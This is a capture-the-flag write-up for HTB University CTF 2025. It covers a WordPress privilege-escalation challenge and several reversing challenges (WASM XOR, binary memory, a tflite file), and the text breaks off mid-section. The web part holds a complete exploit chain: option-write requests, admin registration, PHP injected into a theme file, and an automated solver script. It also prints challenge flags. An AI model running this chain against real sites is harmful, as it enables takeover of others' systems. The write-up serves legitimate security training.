# HTB University CTF 2025 Writeup


{{< param description >}}

# Web [1/3]

## SilentSnow [very easy]

### Description

{{< admonition type=info title="Click to show the desc" open=false >}}
  The Snow-Post Owl Society, is responsible for delivering all important news, including this week's festival updates and RSVP confirmations, precisely at midnight. However, a malicious code of the Tinker's growing influence—has corrupted the automation on the official website. As a result, no one is receiving the crucial midnight delivery, which means the village doesn't have the final instructions for the Festival, including the required attire, times, dates, and locations. This is a direct consequence of the Tinker’s logic of restrictive festive code, ensuring that the joyful details are locked away. Your mission is to hack the official Snow-Post Owl Society website and find a way to bypass the corrupted code to trigger a mass resent of the latest article, ensuring the Festival details reach every resident before the lights dim forever.
{{< /admonition >}}

### Solve Walkthrough

{{< admonition type=tip title="TL;DR" open=true >}}
  Bypass admin privilege to overwrite settings -> register a new user as **Administrator** -> Inject PHP payload to read the flag in the theme editor settings (choose the inactive theme, then activate the theme later) -> Trigger the payload by visiting the modified theme.
{{< /admonition >}}

**Step 1: Reconnaissance**

- I found the **unauthenticated option write** in the `init()` function (`my_plugin.php`). This function basically checks for the `?settings` parameter and calls the `admin_page()` without any authentication needed. This allowed us to call `my_plugin_action` to enable user registration and set the role of registered users to Administrator.

```php
// src/plugins/my-plugin/my-plugin.php

class My_Plugin {
    
    /**
     * Constructor
     */
    public function __construct() {
        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'));
        add_action('admin_menu', array($this, 'add_admin_menu'));
        add_filter('body_class', array($this, 'add_body_class'));
        add_action("wp_loaded", array($this, "init"), 9999);
    }

    public function init() {
        if (isset($_GET['settings'])) {
            $this->admin_page();
            exit;
        }
    }

    // ... snipped ...

    /**
     * Admin page callback
     */
    public function admin_page() {
        // Ensure user is admin
        if (!is_admin()) {
            wp_die('Access denied');
        }

        if (isset($_POST['my_plugin_action'])) {
            check_admin_referer("my_plugin_nonce", "my_plugin_nonce");
            
            $mode = sanitize_text_field($_POST['mode']);
            update_option($_POST['my_plugin_action'], $mode);
            echo '<div class="updated"><p>Mode saved.</p></div>';
        } elseif (isset($_POST['my_plugin_action']) && $_POST['my_plugin_action'] === 'reset') {
            delete_option('my_plugin_dark_mode');
            echo '<div class="updated"><p>Mode reset to default.</p></div>';
        }

        $current_mode = get_option('my_plugin_dark_mode', 'light');
        ?>
        <div class="wrap">
            <h1>My Plugin Settings</h1>
            <div class="card">
                <h2>Theme Mode</h2>
                <form method="post" action="">
                    <?php wp_nonce_field('my_plugin_nonce', 'my_plugin_nonce'); ?>
                    <table class="form-table">
                        <tr valign="top">
                            <th scope="row">Select Mode</th>
                            <td>
                                <select name="mode">
                                    <option value="light" <?php selected($current_mode, 'light'); ?>>Light Mode</option>
                                    <option value="dark" <?php selected($current_mode, 'dark'); ?>>Dark Mode</option>
                                </select>
                            </td>
                        </tr>
                    </table>
                    <p class="submit">
                        <button type="submit" name="my_plugin_action" value="my_plugin_dark_mode" class="button button-primary">Save Changes</button>
                        <button type="submit" name="my_plugin_action" value="reset" class="button button-secondary">Reset to Default</button>
                    </p>
                </form>
            </div>
        </div>
        <?php
    }
}
```

**Step 2: Get `my_plugin_nonce` value To Overwrite Options Setting**

- Access the `/wp-admin/?settings` endpoint. We'll always using this endpoint to overwrite the setting options later.
- Inside the HTML form element, there is a value in `my_plugin_nonce`.
- Get/copy that nonce value. In my case, the nonce value is: `ea889fe0d4`.

```html
<!-- http://localhost:1337/wp-admin/?settings -->

<form method="post" action="">
  <input type="hidden" id="my_plugin_nonce" name="my_plugin_nonce" value="ea889fe0d4" />
  <input type="hidden" name="_wp_http_referer" value="/wp-admin/?settings" />
  <table class="form-table">
    <tr valign="top">
      <th scope="row">Select Mode</th>
        <td>
          <select name="mode">
            <option value="light">Light Mode</option>
            <option value="dark" selected='selected'>Dark Mode</option>
          </select>
        </td>
    </tr>
  </table>
  <p class="submit">
    <button type="submit" name="my_plugin_action" value="my_plugin_dark_mode" class="button button-primary">Save Changes</button>
    <button type="submit" name="my_plugin_action" value="reset" class="button button-secondary">Reset to Default</button>
  </p>
</form>
```

**Step 3: Enable User Registration and Set The Registered Users Role to Administrator**

- Enable the user registration and set the registered users role by using this POST requests (Do this in your browser console).

```javascript
// 1. Enable User Registration.
fetch('/wp-admin/?settings', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'my_plugin_action=users_can_register&mode=1&my_plugin_nonce=ea889fe0d4'
}).then(r => r.text()).then(console.log)

// 2. Set The Registered Users Role to Administrator.
fetch('/wp-admin/?settings', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'my_plugin_action=default_role&mode=administrator&my_plugin_nonce=ea889fe0d4'
}).then(r => r.text()).then(console.log)
```

**Step 4: Register New Administrator User**

- Access Wordpress register endpoint: `/wp-login.php/?action=register`.

![SilentSnow_01](/images/htb-university-ctf-2025_web1_01.png)

- Here I registered new user with username `ywdh` and email `ywdh@hacker.com`.

**Step 5: Modified Existing Themes and Inject PHP Payload**

- Go to the **Appearance** -> **Theme Editor**, or you can just use this endpoint: `/wp-admin/theme-editor.php`.

![SilentSnow_02](/images/htb-university-ctf-2025_web1_02.png)

- Inside the **Theme Functions** (`functions.php`) file editor, inject the following PHP payload to read the flag that located at `/flag.txt`.

```php
#### READ THE FLAG ####
if (isset($_GET['flag'])) {
	die(file_get_contents('/flag.txt'));
}
```

- For clearance, look at the image below.

![SilentSnow_03](/images/htb-university-ctf-2025_web1_03.png)

- Don't forget to press the **Update File** button to save the file.

**Step 6: Activate The Modified Theme**

- Go to **Appearance** -> **Themes** and **Activate** the modified that was injected by our PHP payload.

![SilentSnow_04](/images/htb-university-ctf-2025_web1_04.png)

**Step 7: Get The Flag**

- Go to `http://localhost:1337` and we'll see that the default theme was successfully changed.

![SilentSnow_05](/images/htb-university-ctf-2025_web1_05.png)

- Then, if we try to add the query parameter like this: `/?flag` we got the flag.

![SilentSnow_06](/images/htb-university-ctf-2025_web1_06.png)

- To automate this process, I created a solver script:

```python
#!/usr/bin/env python3
"""
SilentSnow CTF Challenge Solver
HTB University CTF 2025

Vulnerability: Unauthenticated WordPress Option Write
- Plugin exposes admin_page() via ?settings parameter without proper auth
- Allows arbitrary option updates via my_plugin_action POST parameter
- Can enable user registration and set default role to administrator
- Automatic login on registration allows immediate admin access
"""

import requests
from bs4 import BeautifulSoup
import re
import sys
import time
import argparse

# ANSI color codes for output
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'

DEBUG = False

def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[-]{Colors.END} {msg}")

def log_debug(msg):
    if DEBUG:
        print(f"{Colors.CYAN}[DEBUG]{Colors.END} {msg}")

def save_debug_file(filename, content):
    """Save debug content to file"""
    if DEBUG:
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(content)
            log_debug(f"Saved debug output to: {filename}")
        except Exception as e:
            log_warning(f"Could not save debug file: {e}")

# Step 1: Get the nonce from the bypass admin check
def get_nonce(session: requests.Session, url: str) -> str:
    """
    Access /wp-admin/?settings to get the nonce value.
    The ?settings parameter triggers admin_page() without proper auth.
    """
    log_info("Step 1: Getting nonce from /wp-admin/?settings")
    
    try:
        resp = session.get(f"{url}/wp-admin/?settings", timeout=10)
        
        log_debug(f"Response status: {resp.status_code}")
        log_debug(f"Response URL: {resp.url}")
        log_debug(f"Response headers: {dict(resp.headers)}")
        
        if DEBUG:
            save_debug_file('debug_01_settings_page.html', resp.text)
        
        if resp.status_code != 200:
            log_error(f"Failed to access settings page. Status: {resp.status_code}")
            log_debug(f"Response text (first 500 chars): {resp.text[:500]}")
            return None
        
        # Parse HTML to extract nonce
        soup = BeautifulSoup(resp.text, 'html.parser')
        nonce_input = soup.find('input', {'name': 'my_plugin_nonce'})
        
        if not nonce_input:
            log_error("Could not find my_plugin_nonce in page")
            log_debug("Looking for all input fields...")
            all_inputs = soup.find_all('input')
            for inp in all_inputs:
                log_debug(f"  Found input: name={inp.get('name')}, id={inp.get('id')}, type={inp.get('type')}")
            return None
        
        nonce = nonce_input.get('value')
        log_success(f"Retrieved nonce: {nonce}")
        return nonce
    
    except Exception as e:
        log_error(f"Exception while getting nonce: {e}")
        if DEBUG:
            import traceback
            log_debug(f"Full traceback:\n{traceback.format_exc()}")
        return None

# Step 2: Use the nonce to modify the settings
def modify_settings(session: requests.Session, url: str, nonce: str) -> bool:
    """
    Exploit the arbitrary option write vulnerability:
    1. Enable user registration (users_can_register = 1)
    2. Set default role to administrator (default_role = administrator)
    """
    log_info("Step 2: Modifying WordPress settings")
    
    try:
        # Enable user registration
        log_info("  -> Enabling user registration...")
        
        data = {
            'my_plugin_action': 'users_can_register',
            'mode': '1',
            'my_plugin_nonce': nonce
        }
        log_debug(f"POST data: {data}")
        
        resp = session.post(
            f"{url}/wp-admin/?settings",
            data=data,
            timeout=10
        )
        
        log_debug(f"Response status: {resp.status_code}")
        if DEBUG:
            save_debug_file('debug_02_enable_registration.html', resp.text)
        
        if "Mode saved" in resp.text:
            log_success("  -> User registration enabled")
        else:
            log_warning("  -> Could not confirm registration enabled")
            log_debug(f"Response text (first 300 chars): {resp.text[:300]}")
        
        # Get fresh nonce after POST
        resp = session.get(f"{url}/wp-admin/?settings", timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        nonce_input = soup.find('input', {'name': 'my_plugin_nonce'})
        if nonce_input:
            nonce = nonce_input.get('value')
            log_debug(f"Got fresh nonce: {nonce}")
        
        # Set default role to administrator
        log_info("  -> Setting default role to administrator...")
        
        data = {
            'my_plugin_action': 'default_role',
            'mode': 'administrator',
            'my_plugin_nonce': nonce
        }
        log_debug(f"POST data: {data}")
        
        resp = session.post(
            f"{url}/wp-admin/?settings",
            data=data,
            timeout=10
        )
        
        log_debug(f"Response status: {resp.status_code}")
        if DEBUG:
            save_debug_file('debug_03_set_admin_role.html', resp.text)
        
        if "Mode saved" in resp.text:
            log_success("  -> Default role set to administrator")
        else:
            log_warning("  -> Could not confirm default role change")
            log_debug(f"Response text (first 300 chars): {resp.text[:300]}")
        
        return True
    
    except Exception as e:
        log_error(f"Exception while modifying settings: {e}")
        if DEBUG:
            import traceback
            log_debug(f"Full traceback:\n{traceback.format_exc()}")
        return False

# Step 3: Register a new user with administrator role
def register_admin(session: requests.Session, url: str) -> tuple:
    """
    Register a new user who will automatically:
    1. Be assigned administrator role (due to default_role setting)
    2. Be logged in (due to my_auto_login_new_user hook)
    """
    log_info("Step 3: Registering new administrator user")
    
    # Generate unique username
    timestamp = int(time.time())
    username = f"pwn{timestamp}"
    email = f"{username}@hacker.com"
    
    log_debug(f"Username: {username}")
    log_debug(f"Email: {email}")
    
    try:
        data = {
            'user_login': username,
            'user_email': email,
            'wp-submit': 'Register'
        }
        log_debug(f"POST data: {data}")
        
        resp = session.post(
            f"{url}/wp-login.php?action=register",
            data=data,
            allow_redirects=True,
            timeout=10
        )
        
        log_debug(f"Response status: {resp.status_code}")
        log_debug(f"Final URL after redirects: {resp.url}")
        
        if DEBUG:
            save_debug_file('debug_04_registration.html', resp.text)
        
        # Check if we're logged in by accessing wp-admin
        admin_check = session.get(f"{url}/wp-admin/", timeout=10)
        
        log_debug(f"Admin check status: {admin_check.status_code}")
        log_debug(f"Admin check URL: {admin_check.url}")
        
        if DEBUG:
            save_debug_file('debug_05_admin_check.html', admin_check.text)
        
        if "Dashboard" in admin_check.text or "wp-admin" in admin_check.url:
            log_success(f"Successfully registered and logged in as: {username}")
            log_success(f"Email: {email}")
            
            # Check cookies
            log_debug("Session cookies:")
            for cookie in session.cookies:
                log_debug(f"  {cookie.name} = {cookie.value[:50]}...")
            
            return (username, email)
        else:
            log_error("Registration succeeded but not logged in as admin")
            log_debug(f"Admin check response (first 500 chars): {admin_check.text[:500]}")
            return None
    
    except Exception as e:
        log_error(f"Exception while registering user: {e}")
        if DEBUG:
            import traceback
            log_debug(f"Full traceback:\n{traceback.format_exc()}")
        return None

# Step 4: Inject PHP code in functions.php
def inject_php_code(session: requests.Session, url: str) -> bool:
    """
    Inject PHP payload into theme's functions.php to read /flag.txt.
    The payload activates when ?flag parameter is present.
    """
    log_info("Step 4: Injecting PHP code into theme functions.php")
    
    try:
        # Access theme editor
        log_info("  -> Accessing theme editor...")
        
        editor_url = f"{url}/wp-admin/theme-editor.php?file=functions.php&theme=my-theme"
        log_debug(f"Editor URL: {editor_url}")
        
        resp = session.get(editor_url, timeout=10)
        
        log_debug(f"Response status: {resp.status_code}")
        log_debug(f"Response URL: {resp.url}")
        
        if DEBUG:
            save_debug_file('debug_06_theme_editor.html', resp.text)
        
        if resp.status_code != 200:
            log_error("Could not access theme editor")
            log_debug(f"Response text (first 500 chars): {resp.text[:500]}")
            return False
        
        # Parse page to get nonce and current content
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # Debug: Find all forms
        if DEBUG:
            log_debug("Looking for forms on page...")
            forms = soup.find_all('form')
            log_debug(f"Found {len(forms)} forms")
            for idx, form in enumerate(forms):
                log_debug(f"  Form {idx}: action={form.get('action')}, method={form.get('method')}")
        
        # FIXED: WordPress theme editor uses 'nonce' not '_wpnonce'
        nonce_input = soup.find('input', {'name': 'nonce'})
        textarea = soup.find('textarea', {'name': 'newcontent'})
        
        # Debug: Find all inputs and textareas
        if DEBUG and (not nonce_input or not textarea):
            log_debug("Looking for all inputs...")
            all_inputs = soup.find_all('input')
            for inp in all_inputs:
                log_debug(f"  Input: name={inp.get('name')}, id={inp.get('id')}, type={inp.get('type')}")
            
            log_debug("Looking for all textareas...")
            all_textareas = soup.find_all('textarea')
            for ta in all_textareas:
                log_debug(f"  Textarea: name={ta.get('name')}, id={ta.get('id')}")
        
        if not nonce_input or not textarea:
            log_error("Could not find required form elements")
            log_error(f"  nonce_input found: {nonce_input is not None}")
            log_error(f"  textarea found: {textarea is not None}")
            
            # Check if we're actually on the right page
            if "Theme File Editor" not in resp.text and "theme-editor" not in resp.text:
                log_error("Page doesn't appear to be the theme editor")
                log_debug("Checking for redirect or login requirement...")
                if "wp-login" in resp.text or "login" in resp.url.lower():
                    log_error("Appears to have been redirected to login page")
            
            return False
        
        wp_nonce = nonce_input.get('value')
        current_content = textarea.text
        
        log_debug(f"Got nonce: {wp_nonce}")
        log_debug(f"Current content length: {len(current_content)} chars")
        log_debug(f"Current content preview (first 200 chars):\n{current_content[:200]}")
        
        # Inject payload at the beginning of the file
        php_payload = """<?php
#### READ THE FLAG ####
if (isset($_GET['flag'])) {
    die(file_get_contents('/flag.txt'));
}
?>
"""
        
        new_content = php_payload + "\n" + current_content
        
        log_info("  -> Updating functions.php with payload...")
        log_debug(f"New content length: {len(new_content)} chars")
        
        # Get other hidden fields
        action_input = soup.find('input', {'name': 'action'})
        file_input = soup.find('input', {'name': 'file'})
        theme_input = soup.find('input', {'name': 'theme'})
        
        post_data = {
            'newcontent': new_content,
            'action': action_input.get('value') if action_input else 'update',
            'file': file_input.get('value') if file_input else 'functions.php',
            'theme': theme_input.get('value') if theme_input else 'my-theme',
            'nonce': wp_nonce,
            'submit': 'Update File'
        }
        
        log_debug(f"POST data keys: {list(post_data.keys())}")
        
        resp = session.post(
            f"{url}/wp-admin/theme-editor.php",
            data=post_data,
            timeout=10
        )
        
        log_debug(f"Response status: {resp.status_code}")
        
        if DEBUG:
            save_debug_file('debug_07_file_update.html', resp.text)
        
        if "File edited successfully" in resp.text:
            log_success("PHP payload injected successfully!")
            return True
        else:
            log_warning("Could not confirm file update")
            log_debug(f"Response text (first 500 chars): {resp.text[:500]}")
            
            # Check if loopback error occurred
            if "Unable to communicate back with site" in resp.text:
                log_warning("Loopback error detected, but payload may still work")
                return True
            
            # Check for other errors
            if "error" in resp.text.lower():
                log_debug("Searching for error messages...")
                error_div = soup.find('div', class_='error')
                if error_div:
                    log_error(f"Error message: {error_div.get_text(strip=True)}")
            
            return False
    
    except Exception as e:
        log_error(f"Exception while injecting code: {e}")
        if DEBUG:
            import traceback
            log_debug(f"Full traceback:\n{traceback.format_exc()}")
        return False

# Step 5: Change and activate the theme
def change_theme(session: requests.Session, url: str) -> bool:
    """
    Activate the modified theme to ensure our payload runs.
    """
    log_info("Step 5: Activating modified theme")
    
    try:
        # Get themes page to find activation link
        resp = session.get(f"{url}/wp-admin/themes.php", timeout=10)
        
        log_debug(f"Response status: {resp.status_code}")
        
        if DEBUG:
            save_debug_file('debug_08_themes_page.html', resp.text)
        
        # Look for my-theme activation link
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # Check if theme is already active
        if 'my-theme' in resp.text and 'Active:' in resp.text:
            log_success("Theme 'my-theme' is already active")
            return True
        
        # Find activation link
        activation_link = None
        for link in soup.find_all('a', href=True):
            if 'action=activate' in link['href'] and 'my-theme' in link['href']:
                activation_link = link['href']
                log_debug(f"Found activation link: {activation_link}")
                break
        
        if activation_link:
            # Make sure it's a full URL
            if not activation_link.startswith('http'):
                activation_link = url + '/wp-admin/' + activation_link
            
            log_info(f"  -> Activating theme via: {activation_link}")
            resp = session.get(activation_link, timeout=10)
            
            log_debug(f"Activation response status: {resp.status_code}")
            
            if DEBUG:
                save_debug_file('debug_09_theme_activation.html', resp.text)
            
            if resp.status_code == 200:
                log_success("Theme activated successfully")
                return True
        else:
            log_warning("Could not find activation link, theme may already be active")
            return True
    
    except Exception as e:
        log_error(f"Exception while activating theme: {e}")
        if DEBUG:
            import traceback
            log_debug(f"Full traceback:\n{traceback.format_exc()}")
        return False

def get_flag(session: requests.Session, url: str) -> str:
    """
    Trigger the injected payload by accessing /?flag to retrieve the flag.
    """
    log_info("Step 6: Retrieving flag")
    
    try:
        flag_url = f"{url}/?flag"
        log_debug(f"Accessing: {flag_url}")
        
        resp = session.get(flag_url, timeout=10)
        
        log_debug(f"Response status: {resp.status_code}")
        log_debug(f"Response length: {len(resp.text)} bytes")
        
        if DEBUG:
            save_debug_file('debug_10_flag_response.txt', resp.text)
        
        # Look for HTB flag format
        flag_match = re.search(r'HTB\{[^}]+\}', resp.text)
        
        if flag_match:
            flag = flag_match.group(0)
            return flag
        else:
            log_error("No flag found in response")
            log_info(f"Response preview (first 500 chars): {resp.text[:500]}")
            log_info(f"Response preview (last 200 chars): {resp.text[-200:]}")
            return None
    
    except Exception as e:
        log_error(f"Exception while getting flag: {e}")
        if DEBUG:
            import traceback
            log_debug(f"Full traceback:\n{traceback.format_exc()}")
        return None

def exp(url: str) -> None:
    """
    Main exploitation function that chains all steps together.
    """
    print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}SilentSnow CTF Challenge Solver{Colors.END}")
    print(f"{Colors.BOLD}HTB University CTF 2025{Colors.END}")
    print(f"{Colors.BOLD}{'='*60}{Colors.END}\n")
    
    if DEBUG:
        log_warning("DEBUG MODE ENABLED - Verbose output and file saving active")
        print()
    
    log_info(f"Target: {url}")
    
    # Create session to maintain cookies
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    log_debug(f"Session headers: {dict(session.headers)}")
    
    # Step 1: Get nonce
    nonce = get_nonce(session, url)
    if not nonce:
        log_error("Failed to get nonce. Exiting.")
        sys.exit(1)
    
    # Step 2: Modify settings
    if not modify_settings(session, url, nonce):
        log_error("Failed to modify settings. Exiting.")
        sys.exit(1)
    
    # Step 3: Register admin user
    user_info = register_admin(session, url)
    if not user_info:
        log_error("Failed to register admin user. Exiting.")
        sys.exit(1)
    
    # Step 4: Inject PHP code
    if not inject_php_code(session, url):
        log_error("Failed to inject PHP code. Exiting.")
        sys.exit(1)
    
    # Step 5: Activate theme
    if not change_theme(session, url):
        log_warning("Theme activation uncertain, but continuing...")
    
    # Step 6: Get flag
    flag = get_flag(session, url)
    
    if flag:
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}🎉 FLAG CAPTURED! 🎉{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"\n{Colors.GREEN}{Colors.BOLD}{flag}{Colors.END}\n")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}\n")
    else:
        log_error("Failed to retrieve flag")
        log_warning("Try accessing manually: " + url + "/?flag")
        sys.exit(1)

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='SilentSnow CTF Challenge Solver')
    parser.add_argument('url', nargs='?', default='http://localhost:1337', 
                       help='Target URL (default: http://localhost:1337)')
    parser.add_argument('-d', '--debug', action='store_true',
                       help='Enable debug mode with verbose output')
    
    args = parser.parse_args()
    
    URL = args.url.rstrip('/')
    DEBUG = args.debug
    
    try:
        exp(URL)
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        if DEBUG:
            import traceback
            log_debug(f"Full traceback:\n{traceback.format_exc()}")
        sys.exit(1)
```

- If you want to run with debug mode, use `-d` or `--debug` option like this:

> Debug option will create a bunch of output files every steps.

```bash
python3 sol.py -d
```

- Or, change the IP with the target server with this command:

```bash
python3 sol.py 1.2.3.4:1337 --debug
```

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `HTB{s1l3nt_snow_b3y0nd_tinselwick_t0wn_58f1bc535936e97714357f4e7d298120}`
{{< /admonition >}}

---

# Reverse [3/3]

## 1. Clock Work Memory [very easy]

### Description

{{< admonition type=info title="Click to show the desc" open=false >}}
  Twillie's "Clockwork Memory" pocketwatch is broken. The memory it holds, a precious story about the Starshard, has been distorted. By reverse-engineering the intricate "clockwork" mechanism of the `pocketwatch.wasm` file, you can discover the source of the distortion and apply the correct "peppermint" key to remember the truth.
{{< /admonition >}}

### Solve Walkthrough

{{< admonition type=tip title="TL;DR" open=true >}}
  WASM reverse engineering challenge involving XOR decryption. Decompile the WASM file to WAT format, analyze the check_flag function to understand the XOR encryption algorithm, extract the 4-byte key (`0x4B434F54 = "TOCK"`) and 23-byte encrypted data from memory offset 1024, then XOR decrypt to retrieve the flag.
{{< /admonition >}}

**Step 1: Initial Analysis**

We're given a WebAssembly binary file `pocketwatch.wasm`. To analyze it, we need to decompile it into a human-readable format.

**Tools needed:**

- `wasm2wat` from WABT (WebAssembly Binary Toolkit). Install the tool using this command (in Linux):

```bash
sudo apt install -y wabt
```

**Decompilation command:**

```bash
wasm2wat pocketwatch.wasm -o output.wat
```

This converts the binary WASM format into WebAssembly Text (WAT) format, which we can analyze.

**Step 2: Analyzing the WAT Code**

Opening `output.wat`, we find several exported functions. The most interesting one is   `check_flag` (function 1), which takes an input string and validates it.

**Key observations from the check_flag function:**

```wasm
(func (;1;) (type 1) (param i32) (result i32)
  (local i32 i32 i32 i32)
  global.get 0
  i32.const 32
  i32.sub
  local.tee 2
  global.set 0
  local.get 2
  i32.const 1262702420
  i32.store offset=27 align=1
```

The function stores the constant `1262702420` at stack offset 27. This is our XOR key!

**Converting the key to bytes:**

- 1262702420 in hexadecimal = 0x4B434F54
- In little-endian format: [0x54, 0x4F, 0x43, 0x4B]
- As ASCII: "TOCK" - fitting the clockwork theme!

**The decryption loop:**

```wasm
loop  ;; label = @1
  local.get 1
  local.get 2
  i32.add
  local.get 2
  i32.const 27
  i32.add
  local.get 1
  i32.const 3
  i32.and
  i32.add
  i32.load8_u
  local.get 1
  i32.load8_u offset=1024
  i32.xor
  i32.store8
  local.get 1
  i32.const 1
  i32.add
  local.tee 1
  i32.const 23
  i32.ne
  br_if 0 (;@1;)
end
```

This loop:

- Runs 23 times (i = 0 to 22)
- Loads a key byte: key[i & 3] (repeating 4-byte key)
- Loads encrypted byte from memory: memory[1024 + i]
- XORs them together
- Stores the result

**The encrypted data:**

```txt
(data (;0;) (i32.const 1024) "\1c\1b\010#{0&\0b=p=\0b~0\147\7fs'un>")
```

**Step 3: Understanding the Algorithm**

The decryption algorithm is straightforward:

- **Key**: 4 bytes `[0x54, 0x4F, 0x43, 0x4B]` = **"TOCK"**
- **Encrypted data**: 23 bytes at memory offset 1024
- **Decryption**: `flag[i] = encrypted[i] XOR key[i % 4]`
- The function compares the decrypted result with user input to validate the flag

**Step 4: Extracting the Encrypted Data**

- **Challenge**: The WAT text format uses escape sequences that can be ambiguous. Octal escape sequences like `\010` and `\147` need careful parsing, and some bytes might not display correctly in text format.

- **Solution**: Extract the raw bytes directly from the binary WASM file.

We know the encrypted data starts with bytes `0x1c 0x1b`, so we can search for this pattern in the binary file.

**Step 5: Creating the Solution Script**

Here's a Python script that extracts the encrypted data from the WASM binary and decrypts it:

```python
#!/usr/bin/env python3

# Read the WASM file as binary
with open('pocketwatch.wasm', 'rb') as f:
  wasm_data = f.read()

# Search for the encrypted data
# We know it starts with 0x1c 0x1b based on the WAT decompilation
start_idx = wasm_data.find(b'\x1c\x1b')

if start_idx == -1:
  print("Error: Could not find encrypted data in WASM file")
  exit(1)

# Extract 23 bytes of encrypted data
encrypted = list(wasm_data[start_idx:start_idx + 23])

print("Encrypted bytes found at offset:", start_idx)
print("Encrypted data (hex):", ' '.join(f'{b:02x}' for b in encrypted))
print()

# XOR key: 1262702420 = 0x4B434F54 (little-endian) = "TOCK"
key = [0x54, 0x4F, 0x43, 0x4B]  # T, O, C, K

print("XOR Key:", ''.join(chr(b) for b in key))
print("Key (hex):", ' '.join(f'{b:02x}' for b in key))
print()

# Decrypt by XORing each byte with the repeating key
flag = ''
for i in range(23):
  decrypted_byte = encrypted[i] ^ key[i % 4]
  flag += chr(decrypted_byte)

print("Decrypted flag:", flag)
```

**Step 6: Running the Solution**

Execute the script:

```bash
python3 solve.py

# Output:
Encrypted bytes found at offset: 387
Encrypted data (hex): 1c 1b 01 30 23 7b 30 26 0b 3d 70 3d 0b 7e 30 14 37 7f 73 27 75 6e 3e
XOR Key: TOCK
Key (hex): 54 4f 43 4b
Decrypted flag: HTB{w4sm_r3v_1s_c00l!!}
```

**Verification**
Let's verify a few bytes manually:

- `encrypted[0] ^ key[0] = 0x1c ^ 0x54 = 0x48` = 'H' ✓
- `encrypted[1] ^ key[1] = 0x1b ^ 0x4F = 0x54` = 'T' ✓
- `encrypted[2] ^ key[2] = 0x01 ^ 0x43 = 0x42` = 'B' ✓
- `encrypted[3] ^ key[3] = 0x30 ^ 0x4B = 0x7B` = '{' ✓

Perfect match!

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `HTB{w4sm_r3v_1s_c00l!!}`
{{< /admonition >}}

## 2. Starshard Reassembly [easy]

### Description

{{< admonition type=info title="Click to show the desc" open=false >}}
  Twillie Snowdrop, the village's Memory-Minder, has discovered that one of her enchanted snowglobes has gone cloudy , its Starshard missing and its memories scrambled. To restore the scene within, you must provide the correct sequence of "memory shards". The binary will accept your attempt and reveal whether the Starshard glows once more. Can you decipher the snowglobe’s secret and bring the memory back to life?
{{< /admonition >}}

### Solve Walkthrough

{{< admonition type=tip title="TL;DR" open=true >}}
  The flag is inside the memory, so we can just debug the binary with `pwndbg` or `lldb`, then disassembly each function. The function that we focuses are `main.R0.Expected` until `main.R27.Expected`.
{{< /admonition >}}

- Here are the disassembly of 27 expected main function (in hex).

```python
expected_key = [
  0x48, 0x54, 0x42, 0x7b, 0x4d, 0x33, 0x4d, 0x30, 0x52, 0x59, 0x5f,
  0x52, 0x33, 0x57, 0x31, 0x44, 0x5f, 0x53, 0x4e, 0x4f, 0x57,
  0x47, 0x4c, 0x30, 0x42, 0x33, 0x7d, 0x20
]
```

- Then, we can just iterate and check with `chr` function to get the flag. Here's my final solver:

```python
expected_key = [
  0x48, 0x54, 0x42, 0x7b, 0x4d, 0x33, 0x4d, 0x30, 0x52, 0x59, 0x5f,
  0x52, 0x33, 0x57, 0x31, 0x44, 0x5f, 0x53, 0x4e, 0x4f, 0x57,
  0x47, 0x4c, 0x30, 0x42, 0x33, 0x7d, 0x20
]

flag = "".join([chr(x) for x in expected_key])
print(f"Flag -> {flag}") # HTB{M3M0RY_R3W1D_SNOWGL0B3}
```

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `HTB{M3M0RY_R3W1D_SNOWGL0B3}`
{{< /admonition >}}

## 3. CloudlyCore [medium]

### Description

{{< admonition type=info title="Click to show the desc" open=false >}}
  Twillie, the memory-minder, was rewinding one of her snowglobes when she overheard a villainous whisper. The scoundrel was boasting about hiding the Starshard's true memory inside this tiny memory core (.tflite). He was so overconfident, laughing that no one would ever think to reverse-engineer a 'boring' ML file. He said he 'left a little challenge for anyone who did,' scrambling the final piece with a simple XOR just for fun. Find the key, reverse the laughably simple XOR, and restore the memory.
{{< /admonition >}}

### Solve Walkthrough

{{< admonition type=tip title="TL;DR" open=true >}}
  Extract the encrypted flag (36 bytes) from the `arith.constant` tensor and the key (`k3y!`) from the `meta_holder` tensor. XOR-decrypt the data, then decompress the result with zlib. This will reveals the flag.
{{< /admonition >}}

**Step 1: Initial Inspection**

Start with basic tools:
- `file snownet_stronger.tflite` to verify the format.

```bash
file snownet_stronger.tflite

# Output:
snownet_stronger.tflite: data
```

- `strings` and use **Netron** tool to discover tensor names such as `arith.constant` and `meta_holder`.

```bash
strings snownet_stronger.tflite

# Output:
TFL3
serving_default
output_1
output_0
in_payload
in_meta
CONVERSION_METADATA
min_runtime_version
2.19.0
1.5.0
DO      Y
$k^[)
MLIR Converted.
main
